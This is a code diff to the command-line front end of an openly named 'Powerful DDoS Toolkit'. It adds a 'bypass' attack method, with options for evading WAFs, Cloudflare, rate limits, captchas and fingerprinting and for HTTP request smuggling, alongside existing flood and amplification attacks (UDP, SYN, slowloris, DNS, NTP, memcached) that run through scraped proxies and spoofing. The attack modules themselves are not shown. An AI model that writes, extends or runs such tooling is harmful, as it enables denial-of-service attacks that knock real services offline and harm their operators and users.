@@ -14,6 +14,7 @@ from attacks import (
     dns_amp,
     ntp_amp,
     memcached_amp,
+    bypass_attack,
 )
 from core.real_ip import detect_real_ip
 from core.proxy_scraper import scrape_proxies, scrape_user_agents
@@ -60,7 +61,6 @@ def run_port_scan(target):
     """Run port scanner from port_scan_attack.py then optionally launch attack."""
     try:
         import port_scan_attack
-        # Override sys.argv for port_scan_attack main
         sys.argv = ["port_scan_attack.py", target]
         port_scan_attack.main()
     except ImportError:
@@ -71,11 +71,11 @@ def run_port_scan(target):
         pass
 
 def main():
-    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper and Port Scanner")
+    parser = argparse.ArgumentParser(description="Powerful DDoS Toolkit with Proxy Scraper, Port Scanner, and Bypass Attacks")
     parser.add_argument("--target", help="Target IP or domain")
     parser.add_argument("--port", type=int, default=80, help="Target port")
     parser.add_argument("--method",
-                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp"],
+                        choices=["udp", "syn", "http", "slowloris", "dns", "ntp", "memcached", "icmp", "tcp", "bypass"],
                         help="Attack method")
     parser.add_argument("--threads", type=int, default=100, help="Number of threads")
     parser.add_argument("--duration", type=int, default=60, help="Duration in seconds")
@@ -85,12 +85,18 @@ def main():
     # Proxy / UA Scraper
     parser.add_argument("--scrape-proxies", action="store_true", help="Scrape proxies lalu keluar")
     parser.add_argument("--scrape-ua", action="store_true", help="Scrape user-agents lalu keluar")
-    parser.add_argument("--proxy", action="store_true", help="Gunakan proxy dari proxy.txt untuk HTTP/Slowloris")
+    parser.add_argument("--proxy", action="store_true", help="Gunakan proxy dari proxy.txt untuk HTTP/Slowloris/Bypass")
     parser.add_argument("--proxy-file", type=str, help="File proxy custom")
     parser.add_argument("--ua-file", type=str, help="File user-agent custom untuk HTTP flood")
 
     # Port Scanner
     parser.add_argument("--scan", action="store_true", help="Jalankan port scanner terhadap target")
+
+    # Bypass Attack
+    parser.add_argument("--bypass-technique", type=str,
+                        choices=["waf", "cloudflare", "rate_limit", "captcha", "fingerprint", "http2", "tls", "http_request_smuggling"],
+                        help="Teknik bypass yang digunakan (hanya untuk --method bypass)")
+    parser.add_argument("--https", action="store_true", help="Gunakan HTTPS/SSL untuk koneksi (terutama untuk bypass)")
 
     args = parser.parse_args()
 
@@ -168,6 +174,12 @@ def main():
         elif args.method == "slowloris":
             slowloris.attack(target, args.port, args.threads, args.duration, args.spoof,
                              proxies=proxies)
+        elif args.method == "bypass":
+            bypass_attack.attack(target, args.port, args.threads, args.duration,
+                                 spoof=args.spoof,
+                                 technique=args.bypass_technique,
+                                 proxies=proxies,
+                                 use_https=args.https)
         else:
             method_map[args.method](target, args.port, args.threads, args.duration, args.spoof)
     except KeyboardInterrupt:
